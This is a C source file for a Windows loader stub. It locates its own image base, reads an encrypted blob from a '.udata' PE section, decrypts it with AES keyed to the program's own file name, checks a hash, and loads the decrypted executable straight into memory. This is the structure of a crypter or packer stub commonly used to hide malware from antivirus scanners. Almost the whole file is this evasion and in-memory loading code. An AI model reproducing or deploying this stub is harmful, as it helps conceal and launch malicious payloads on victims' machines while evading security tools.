#include "main.h"
#include <shlwapi.h>

#pragma pack(1)
struct Data {
	char hashdata[33];
	DWORD buf_size;	
	char buf[1];
};
#pragma pack()

PCHAR* CommandLineToArgvA(PCHAR CmdLine, int* _argc)
{
	PCHAR* argv;
	PCHAR  _argv;
	ULONG   len;
	ULONG   argc;
	CHAR   a;
	ULONG   i, j;

	BOOLEAN  in_QM;
	BOOLEAN  in_TEXT;
	BOOLEAN  in_SPACE;

	len = strlen(CmdLine);
	i = ((len + 2) / 2) * sizeof(PVOID) + sizeof(PVOID);

	argv = (PCHAR*)GlobalAlloc(GMEM_FIXED,
		i + (len + 2) * sizeof(CHAR));

	_argv = (PCHAR)(((PUCHAR)argv) + i);

	argc = 0;
	argv[argc] = _argv;
	in_QM = FALSE;
	in_TEXT = FALSE;
	in_SPACE = TRUE;
	i = 0;
	j = 0;

	while (a = CmdLine[i]) {
		if (in_QM) {
			if (a == '\"') {
				in_QM = FALSE;
			}
			else {
				_argv[j] = a;
				j++;
			}
		}
		else {
			switch (a) {
			case '\"':
				in_QM = TRUE;
				in_TEXT = TRUE;
				if (in_SPACE) {
					argv[argc] = _argv + j;
					argc++;
				}
				in_SPACE = FALSE;
				break;
			case ' ':
			case '\t':
			case '\n':
			case '\r':
				if (in_TEXT) {
					_argv[j] = '\0';
					j++;
				}
				in_TEXT = FALSE;
				in_SPACE = TRUE;
				break;
			default:
				in_TEXT = TRUE;
				if (in_SPACE) {
					argv[argc] = _argv + j;
					argc++;
				}
				_argv[j] = a;
				j++;
				in_SPACE = FALSE;
				break;
			}
		}
		i++;
	}
	_argv[j] = '\0';
	argv[argc] = NULL;

	(*_argc) = argc;
	return argv;
}

size_t FindImageBase() {
#ifndef _WIN64
	size_t ImageBase;
	size_t *AddressFunc = (size_t*)&FindImageBase;

	size_t a = (size_t)AddressFunc & 0xffff0000;
	while (*(WORD*)a != 0x5a4d)
	{
		a = a - 0x10000;
	}
	ImageBase = a;
	return ImageBase;
#elif _WIN32
	size_t ImageBase;
	size_t *AddressFunc = (size_t*)&FindImageBase;

	size_t a = (size_t)AddressFunc & 0xffffffffffff0000;
	while (*(WORD*)a != 0x5a4d)
	{
		a = a - 0x10000;
	}
	ImageBase = a;

	return ImageBase;
#endif
}

int main(int argc, char* argv[])
{
	char ExePath[MAX_PATH];
	GetModuleFileNameA(NULL, ExePath, MAX_PATH);
	char *ExeName = PathFindFileNameA(ExePath);

	char *ImageBase = (char*)FindImageBase();

	const IMAGE_DOS_HEADER *pDos = (const IMAGE_DOS_HEADER*)ImageBase;
	char *pChDos = (char*)ImageBase;
	IMAGE_NT_HEADERS *pNTHead = (IMAGE_NT_HEADERS*)((char*)pChDos + pDos->e_lfanew);
	DWORD dwFullNTSize = sizeof(IMAGE_NT_HEADERS) - (sizeof(IMAGE_OPTIONAL_HEADER) - pNTHead->FileHeader.SizeOfOptionalHeader);
	IMAGE_SECTION_HEADER *pSectHead = (IMAGE_SECTION_HEADER*)((char*)pNTHead + dwFullNTSize);

	int NumberOfSection = pNTHead->FileHeader.NumberOfSections;
	int iSection = -1;
	for (int i = 0; i < NumberOfSection; i++)
	{
		if (!strcmp((char*)pSectHead[i].Name, ".udata"))
		{
			iSection = i;
			break;
		}

	}
	if (iSection >= 0)
	{
		char *buf = (char*)calloc(pSectHead[iSection].Misc.VirtualSize + 1, 1);
		if (buf)
		{
			memcpy(buf, ImageBase + pSectHead[iSection].VirtualAddress, pSectHead[iSection].Misc.VirtualSize);
			Data *sData = (Data*)(buf);
			DWORD dwExeSize = sData->buf_size;

			char *dec_exe = (char*)AES_Decrypt((BYTE*)sData->buf, dwExeSize, ExeName);
			if (dec_exe)
			{
				char *hashdata = hash(dec_exe, dwExeSize);
				if (hashdata)
				{
					if (!memcmp(hashdata, sData->hashdata, 32))
					{
						HMODULE hExe = Load(dec_exe, dwExeSize);

						Release(hExe);
					}

					free(hashdata);
				}

				free(dec_exe);
			}

			free(buf);
		}
	}
}

int WINAPI WinMain(_In_ HINSTANCE hInstance, _In_opt_ HINSTANCE hPrevInstance, _In_ LPSTR lpCmdLine, _In_ int nShowCmd)
{
	int argc;
	PCHAR *argv = CommandLineToArgvA(lpCmdLine, &argc);

	return main(argc, argv);
}